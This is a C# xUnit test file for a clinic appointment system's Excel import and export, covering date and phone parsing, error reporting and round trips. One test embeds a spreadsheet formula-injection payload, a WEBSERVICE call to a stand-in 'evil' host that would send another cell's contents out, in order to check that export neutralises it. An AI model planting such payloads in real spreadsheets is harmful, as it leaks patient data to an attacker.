using Clinic.Api.Domain;
using Clinic.Api.Services.Excel;
using ClosedXML.Excel;
using Xunit;

namespace Clinic.Api.Tests;

public class ExcelWorkbookTests
{
    private static Stream BuildWorkbook(Action<IXLWorksheet> fillRows)
    {
        using var workbook = new XLWorkbook();
        var sheet = workbook.Worksheets.Add(ExcelWorkbook.SheetAppointments);
        var headers = new[]
        {
            "Doctor", "Specialty", "Date", "Start", "Duration(min)",
            "Patient Name", "Patient Phone", "Status", "Notes",
        };
        for (var i = 0; i < headers.Length; i++)
            sheet.Cell(1, i + 1).Value = headers[i];

        fillRows(sheet);

        var stream = new MemoryStream();
        workbook.SaveAs(stream);
        stream.Position = 0;
        return stream;
    }

    [Fact]
    public void Template_contains_both_sheets_and_headers()
    {
        using var stream = new MemoryStream(ExcelWorkbook.BuildTemplate());
        using var workbook = new XLWorkbook(stream);

        Assert.True(workbook.TryGetWorksheet(ExcelWorkbook.SheetAppointments, out _));
        Assert.True(workbook.TryGetWorksheet(ExcelWorkbook.SheetReadMe, out _));
    }

    [Fact]
    public void Parse_reads_a_valid_row()
    {
        using var stream = BuildWorkbook(sheet =>
        {
            sheet.Cell(2, 1).Value = "Dr. Sara Ahmadi";
            sheet.Cell(2, 2).Value = "Cardiology";
            sheet.Cell(2, 3).Value = "1405/06/04";
            sheet.Cell(2, 4).Value = "14:30";
            sheet.Cell(2, 5).Value = "";
            sheet.Cell(2, 6).Value = "Reza Karimi";
            sheet.Cell(2, 7).Value = "0912 345 6789";
            sheet.Cell(2, 8).Value = "Booked";
            sheet.Cell(2, 9).Value = "";
        });

        var outcome = ExcelWorkbook.Parse(stream);

        Assert.Empty(outcome.Problems);
        var row = Assert.Single(outcome.Rows);
        Assert.Equal("Dr. Sara Ahmadi", row.DoctorName);
        Assert.Equal(new DateOnly(2026, 8, 26), row.Date);      // 1405/06/04
        Assert.Equal(new TimeOnly(14, 30), row.Start);
        Assert.Null(row.DurationMinutes);
        Assert.Equal("+989123456789", row.Phone);               // normalized to E.164
        Assert.Equal(AppointmentStatus.Booked, row.Status);
    }

    [Fact]
    public void Parse_reports_each_bad_cell_without_dropping_good_rows()
    {
        using var stream = BuildWorkbook(sheet =>
        {
            // Row 2: bad date + bad time → two problems, row rejected.
            sheet.Cell(2, 1).Value = "Dr. A";
            sheet.Cell(2, 3).Value = "2026/13/45";
            sheet.Cell(2, 4).Value = "9:5";
            sheet.Cell(2, 6).Value = "Patient";
            sheet.Cell(2, 7).Value = "09121234567";

            // Row 3: missing phone → problem.
            sheet.Cell(3, 1).Value = "Dr. B";
            sheet.Cell(3, 3).Value = "1405/06/05";
            sheet.Cell(3, 4).Value = "10:00";
            sheet.Cell(3, 6).Value = "Patient";
            sheet.Cell(3, 7).Value = "";

            // Row 4: valid.
            sheet.Cell(4, 1).Value = "Dr. C";
            sheet.Cell(4, 3).Value = "1405-06-07";
            sheet.Cell(4, 4).Value = "16:45";
            sheet.Cell(4, 5).Value = "25";
            sheet.Cell(4, 6).Value = "Patient";
            sheet.Cell(4, 7).Value = "+989120000000";
            sheet.Cell(4, 8).Value = "cancelled";   // alias → cancelled by clinic

            // Row 6 (after a blank row 5): valid too — blank rows are skipped.
            sheet.Cell(6, 1).Value = "Dr. D";
            sheet.Cell(6, 3).Value = "1405/07/01";
            sheet.Cell(6, 4).Value = "08:00";
            sheet.Cell(6, 6).Value = "Patient";
            sheet.Cell(6, 7).Value = "09130000000";
        });

        var outcome = ExcelWorkbook.Parse(stream);

        Assert.Equal(2, outcome.Rows.Count);
        Assert.Contains(outcome.Rows, r => r.DoctorName == "Dr. C" && r.Status == AppointmentStatus.CancelledByClinic && r.DurationMinutes == 25);

        // Row 2 contributes two problems (bad date, bad time); row 3 one (missing phone).
        Assert.Equal(3, outcome.Problems.Count);
        Assert.All(outcome.Problems, p => Assert.InRange(p.RowNumber, 2, 3));
    }

    [Fact]
    public void Export_round_trips_through_Parse()
    {
        var utc = new DateTime(2026, 8, 26, 7, 0, 0, DateTimeKind.Utc); // 10:30 Tehran
        var bytes = ExcelWorkbook.Export(
        [
            new ExportRow("Dr. Export", "Dermatology", utc, 30, "Ali Ali", "09121110000",
                AppointmentStatus.Booked, "round trip"),
        ]);

        using var stream = new MemoryStream(bytes);
        var outcome = ExcelWorkbook.Parse(stream);

        var row = Assert.Single(outcome.Rows);
        Assert.Empty(outcome.Problems);
        Assert.Equal("Dr. Export", row.DoctorName);
        Assert.Equal(new DateOnly(2026, 8, 26), row.Date);
        Assert.Equal(new TimeOnly(10, 30), row.Start);
        Assert.Equal(30, row.DurationMinutes);
        Assert.Equal("+989121110000", row.Phone);
        Assert.Equal("round trip", row.Notes);
    }

    [Fact]
    public void Parse_rejects_numeric_status_junk()
    {
        // Enum.TryParse alone would accept "7" as (AppointmentStatus)7 — an
        // out-of-range value that slips past the status=0 overlap constraint.
        using var stream = BuildWorkbook(sheet =>
        {
            sheet.Cell(2, 1).Value = "Dr. S";
            sheet.Cell(2, 3).Value = "1405/06/04";
            sheet.Cell(2, 4).Value = "09:00";
            sheet.Cell(2, 6).Value = "Patient";
            sheet.Cell(2, 7).Value = "09121234567";
            sheet.Cell(2, 8).Value = "7";
        });

        var outcome = ExcelWorkbook.Parse(stream);

        Assert.Empty(outcome.Rows);
        Assert.Contains(outcome.Problems, p => p.Message.Contains("Unknown Status"));
    }

    [Fact]
    public void Export_neutralizes_formula_injection()
    {
        var utc = new DateTime(2026, 8, 26, 7, 0, 0, DateTimeKind.Utc); // 10:30 Tehran
        const string payload = "=WEBSERVICE(\"http://evil\")&G2";
        var bytes = ExcelWorkbook.Export(
        [
            new ExportRow("Dr. X", "", utc, 30, payload, "09121110000",
                AppointmentStatus.Booked, "@summary"),
        ]);

        using var stream = new MemoryStream(bytes);

        // In the exported file the dangerous cells must not start with a
        // formula trigger character.
        using (var workbook = new XLWorkbook(stream))
        {
            var sheet = workbook.Worksheet(ExcelWorkbook.SheetAppointments);
            Assert.StartsWith(" ", sheet.Cell(2, 6).GetString()); // patient name
            Assert.StartsWith(" ", sheet.Cell(2, 9).GetString()); // notes
        }

        // Round-tripping through Parse restores the original text (the leading
        // space is trimmed) — it is stored as data, never executed.
        stream.Position = 0;
        var outcome = ExcelWorkbook.Parse(stream);
        var row = Assert.Single(outcome.Rows);
        Assert.Empty(outcome.Problems);
        Assert.Equal(payload, row.PatientName);
        Assert.Equal("@summary", row.Notes);
    }
}
